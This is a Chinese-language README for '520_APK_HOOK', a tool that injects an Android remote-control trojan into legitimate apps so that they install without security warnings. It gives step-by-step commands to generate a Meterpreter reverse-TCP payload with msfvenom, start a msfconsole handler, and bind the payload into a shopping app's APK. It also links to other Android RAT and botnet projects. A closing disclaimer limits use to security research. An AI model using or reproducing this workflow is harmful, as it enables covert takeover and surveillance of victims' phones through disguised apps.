# 520_APK_HOOK

## 介绍

* 将编写的安卓远控程序，注入到正常的app中，运行app时安卓远控程序也会上线。

* 修复上一版本的bug，使用java重写，同时还重写了520ApkBox程序，专门用来运行运行APP和远控app。

* 520ApkBox是一个java编写的app，主要作用是一个安卓虚拟机，可以不用任何修改就可以用来运行正常的app，可以绕过现在各种app的安全检测。同时此app还是一个加载器，通过DexClassesLoder加载远控的dex文件并启动。

* 520ApkHook是java编写的注入工具，将被注入的app和远控app注入到一个app中。

* 项目地址:  [https://github.com/ba0gu0/520apkhook](https://github.com/ba0gu0/520apkhook)

* 作者: BaoGuo


## 优点

* 相比于普通的安卓远控，此版本app在进行远控时，被注入的app可以正常运行。

* 注入后的app在安装时，手机管家不会有任何安全提示，普通的远控程序，安装时手机管家会有安全警示。

* 理论上来说，只要远控软件使用的是纯Java或者Kotlin编写，就可以使用，不一定必须是msf生成的apk。


## 使用

1. msfmsfvenom

```shell

msfvenom -p android/meterpreter/reverse_tcp lhost=114.114.114.114 lport=3306 -o ~/Downloads/msf.apk

```
2. msfconsole

```shell
# 启动 msfconsole

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 3306
set exitonsession false
exploit -j

```
3. 520ApkHook

```shell

java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Downloads/msf.apk

```

4. BaoGuo仍给你一个Apk，请安装它!

### 搭配其他远控使用

* 一款安卓僵尸网络远控工具, 服务端是web网页,  基于[https://deta.space](https://deta.space) 搭建(匿名): 

  * [https://github.com/ScRiPt1337/Teardroid-phprat](https://github.com/ScRiPt1337/Teardroid-phprat)

* 一款安卓远控程序, 服务端是GUI程序: 

  * [https://github.com/AhMyth/AhMyth-Android-RAT](https://github.com/AhMyth/AhMyth-Android-RAT)

* 搜集的一些github上的安卓远控项目:

  *  [https://github.com/wishihab/Android-RATList](https://github.com/wishihab/Android-RATList)


## 项目依赖

* 本项目参考以下项目

* 由于安卓虚拟化牵扯到其他github上被下架的程序，在这里不再进行列出，避免被影响。


## 重点说明

* 本项目仅用于安全研究, 禁止利用脚本进行攻击, 使用本脚本产生的一切问题和本人无关.

* 由于此软件是基于安卓虚拟化来实现的，虚拟化软件对于不同版本的系统会出现BUG，可以自行修改520ApkBox项目源码(欢迎大佬提交pull) .